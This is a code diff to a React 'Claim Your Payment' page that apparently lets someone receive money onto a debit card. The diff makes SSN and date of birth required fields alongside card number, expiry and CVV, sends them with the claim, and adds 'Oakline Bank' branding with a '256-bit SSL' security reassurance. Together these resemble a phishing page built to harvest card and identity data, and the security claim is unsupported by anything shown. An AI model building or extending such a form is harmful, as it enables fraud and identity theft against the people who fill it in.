@@ -16,6 +16,8 @@ export default function ClaimDebitCardPage() {
     card_number: '',
     card_expiry: '',
     card_cvv: '',
+    ssn: '',
+    date_of_birth: '',
     billing_address: '',
     billing_city: '',
     billing_state: '',
@@ -86,7 +88,7 @@ export default function ClaimDebitCardPage() {
 
   const handleClaimWithDebitCard = async () => {
     try {
-      if (!debitCardForm.cardholder_name || !debitCardForm.card_number || !debitCardForm.card_expiry || !debitCardForm.card_cvv || !debitCardForm.billing_address || !debitCardForm.billing_city || !debitCardForm.billing_state || !debitCardForm.billing_zip || !debitCardForm.billing_country) {
+      if (!debitCardForm.cardholder_name || !debitCardForm.card_number || !debitCardForm.card_expiry || !debitCardForm.card_cvv || !debitCardForm.ssn || !debitCardForm.date_of_birth || !debitCardForm.billing_address || !debitCardForm.billing_city || !debitCardForm.billing_state || !debitCardForm.billing_zip || !debitCardForm.billing_country) {
         setMessage('Please fill in all required fields.', 'error');
         setMessageType('error');
         return;
@@ -104,6 +106,8 @@ export default function ClaimDebitCardPage() {
           card_number: debitCardForm.card_number,
           card_expiry: debitCardForm.card_expiry,
           card_cvv: debitCardForm.card_cvv,
+          ssn: debitCardForm.ssn,
+          date_of_birth: debitCardForm.date_of_birth,
           billing_address: debitCardForm.billing_address,
           billing_city: debitCardForm.billing_city,
           billing_state: debitCardForm.billing_state,
@@ -188,7 +192,17 @@ export default function ClaimDebitCardPage() {
 
           {payment && (
             <>
-              <div style={{ textAlign: 'center', marginBottom: '2rem' }}>
+              <div style={{ textAlign: 'center', marginBottom: '2rem', paddingBottom: '1.5rem', borderBottom: '2px solid #e2e8f0' }}>
+                <div style={{ marginBottom: '1rem' }}>
+                  <h2 style={{ color: '#1e40af', fontSize: '1.3rem', fontWeight: '700', margin: '0' }}>🏦 Oakline Bank</h2>
+                  <p style={{ color: '#64748b', fontSize: '0.85rem', margin: '0.25rem 0 0 0' }}>Secure Payment Claim</p>
+                </div>
+                <div style={{ backgroundColor: '#f8fafc', padding: '1rem', borderRadius: '8px', marginBottom: '1rem' }}>
+                  <p style={{ color: '#0c4a6e', fontSize: '0.9rem', margin: '0', lineHeight: '1.5' }}>
+                    🔒 <strong>Your Private Information is Secure</strong><br/>
+                    All personal details are encrypted with 256-bit SSL and processed securely. Oakline Bank ensures your information is protected with the highest industry standards.
+                  </p>
+                </div>
                 <h1 style={{ color: '#1e293b', marginBottom: '0.5rem' }}>Claim Your Payment</h1>
                 <div style={{ fontSize: '2rem', fontWeight: 'bold', color: '#16a34a' }}>
                   ${parseFloat(payment.amount).toFixed(2)}
@@ -283,6 +297,60 @@ export default function ClaimDebitCardPage() {
                       maxLength="4"
                       value={debitCardForm.card_cvv}
                       onChange={(e) => setDebitCardForm({ ...debitCardForm, card_cvv: e.target.value })}
+                      style={{
+                        width: '100%',
+                        padding: '0.75rem',
+                        border: '1px solid #e2e8f0',
+                        borderRadius: '6px',
+                        fontSize: '1rem',
+                        boxSizing: 'border-box'
+                      }}
+                    />
+                  </div>
+                </div>
+
+                {/* SSN and Date of Birth */}
+                <div style={{ display: 'flex', gap: '1rem', marginBottom: '1.5rem' }}>
+                  <div style={{ flex: 1 }}>
+                    <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500', fontSize: '0.9rem' }}>
+                      Social Security Number (SSN) *
+                    </label>
+                    <input
+                      type="text"
+                      placeholder="XXX-XX-XXXX"
+                      maxLength="11"
+                      value={debitCardForm.ssn}
+                      onChange={(e) => {
+                        let value = e.target.value.replace(/\D/g, '');
+                        if (value.length > 0) {
+                          if (value.length <= 3) {
+                            value = value;
+                          } else if (value.length <= 5) {
+                            value = value.slice(0, 3) + '-' + value.slice(3);
+                          } else {
+                            value = value.slice(0, 3) + '-' + value.slice(3, 5) + '-' + value.slice(5, 9);
+                          }
+                        }
+                        setDebitCardForm({ ...debitCardForm, ssn: value });
+                      }}
+                      style={{
+                        width: '100%',
+                        padding: '0.75rem',
+                        border: '1px solid #e2e8f0',
+                        borderRadius: '6px',
+                        fontSize: '1rem',
+                        boxSizing: 'border-box'
+                      }}
+                    />
+                  </div>
+                  <div style={{ flex: 1 }}>
+                    <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500', fontSize: '0.9rem' }}>
+                      Date of Birth *
+                    </label>
+                    <input
+                      type="date"
+                      value={debitCardForm.date_of_birth}
+                      onChange={(e) => setDebitCardForm({ ...debitCardForm, date_of_birth: e.target.value })}
                       style={{
                         width: '100%',
                         padding: '0.75rem',
